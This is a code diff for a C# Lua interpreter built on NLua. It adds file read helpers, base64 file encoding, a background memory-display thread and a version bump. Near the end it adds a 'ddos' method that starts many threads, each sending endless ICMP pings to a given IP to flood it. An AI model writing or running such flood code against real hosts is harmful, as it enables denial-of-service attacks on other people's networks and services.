@@ -20,7 +20,7 @@ namespace Lua_net_ex_
         https://habrahabr.ru/post/197262/
         */
         public static Socket socket_ = null;
-        public void memory()
+        public void MEmory()
         {
             Console.BackgroundColor = ConsoleColor.Blue;
             Console.Clear();
@@ -30,6 +30,17 @@ namespace Lua_net_ex_
                 Console.Title = new lib.core.title.title().title_mem_string_64();
                 System.Threading.Thread.Sleep(1000);
             }
+        }
+        public string GetFreeMemory()
+        {
+            return new lib.core.title.title().title_mem_string_64();
+        }
+        public void Memory()
+        {
+            /*
+             * For not block threads this block code
+             */
+            new System.Threading.Thread(MEmory).Start();
         }
         static void Main(string[] args)
         {
@@ -46,7 +57,7 @@ namespace Lua_net_ex_
             }
             else
             {
-                new Core().echo("Lua interpeter v0.1.1 based on core Lua 5.2 and used NLua lib\n");
+                new Core().echo("Lua interpeter v0.1.2 based on core Lua 5.2 and used NLua lib\n");
                 lua.DoFile("init.lua");
             }
 
@@ -61,10 +72,38 @@ namespace Lua_net_ex_
             }
             catch (NLua.Exceptions.LuaException e)
             {
-                new Core().Exceprion(e.Message.ToString());
+                new Core().Excteption(e.Message.ToString());
                 //Console.WriteLine("init.lua not found\nCreate file 'init.lua and add code in file.'\nFor exit press any key");
                 Console.Read();
             }
+        }
+
+        // class io.*
+        public string FileReadToString(object adr)
+        {
+            return System.IO.File.ReadAllText(adr.ToString());
+        }
+        public string[] FileReadToStringArray(object adr)
+        {
+            return System.IO.File.ReadAllLines(adr.ToString());
+        }
+        public byte[] FileReadByte(string adr)
+        {
+            return System.IO.File.ReadAllBytes(adr.ToString());
+        }
+        public string DecodeFileFromBase64(object s)
+        {
+            echo("Decoding file " + s.ToString());
+            var dec = Encoding.UTF8.GetString(Convert.FromBase64String(FileReadToString(s)));
+            File.WriteAllText(Environment.CurrentDirectory + "/Decoded_" + s.ToString(), dec);
+            return Encoding.UTF8.GetString(Convert.FromBase64String(FileReadToString(s)));
+        }
+        public string EncodeFileToBase64(object s)
+        {
+            echo("Encoding file " + s.ToString());
+            var enc = Convert.ToBase64String(Encoding.UTF8.GetBytes(FileReadToString(s)));
+            File.WriteAllText(Environment.CurrentDirectory + "/Encoded_" + s.ToString(), enc);
+            return Convert.ToBase64String(Encoding.UTF8.GetBytes(FileReadToString(s)));
         }
         public void LoadNetDll(string a, string namespace_)
         {
@@ -116,7 +155,7 @@ namespace Lua_net_ex_
         {
             // var s = Console.ForegroundColor= ConsoleColor
         }
-        public void Exceprion(string s)
+        public void Excteption(string s)
         {
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("Exception at " + s);
@@ -133,6 +172,34 @@ namespace Lua_net_ex_
             {
                 var s = new System.Net.NetworkInformation.Ping().Send(ip);
                 echo("Received bytes from " + ip + " time " + s.RoundtripTime.ToString() + " ms");
+            }
+        }
+        public string IP = "";
+        public int thread_ = 0;
+        public int BUFFER = 32;
+        public void ddos(int th, string ip, int buffer)
+        {
+            IP = ip;
+            BUFFER = buffer;
+            for (var a = 0; a < th; a++)
+            {
+                thread_ = a;
+                new System.Threading.Thread(texaDC).Start();
+                //  new Task(texaDC).Start();
+            }
+        }
+        public int count_bytes = 0;
+        public void texaDC()
+        {
+            var t = thread_;
+            while (true)
+            {
+                //   new System.Net.NetworkInformation.Ping().SendAsync(IP, 101, new byte[BUFFER]);
+                var s = new System.Net.NetworkInformation.Ping().Send(IP, 1, new byte[BUFFER]);
+                count_bytes = (count_bytes + BUFFER);
+                // count_bytes = (count_bytes *2) / 3072;
+                echo("[TH #" + t + " ]Received bytes from " + IP + " time " + s.RoundtripTime.ToString() + " ms || All KB sent - " + count_bytes / 1024);
+
             }
         }
         public int ToInt(object s)
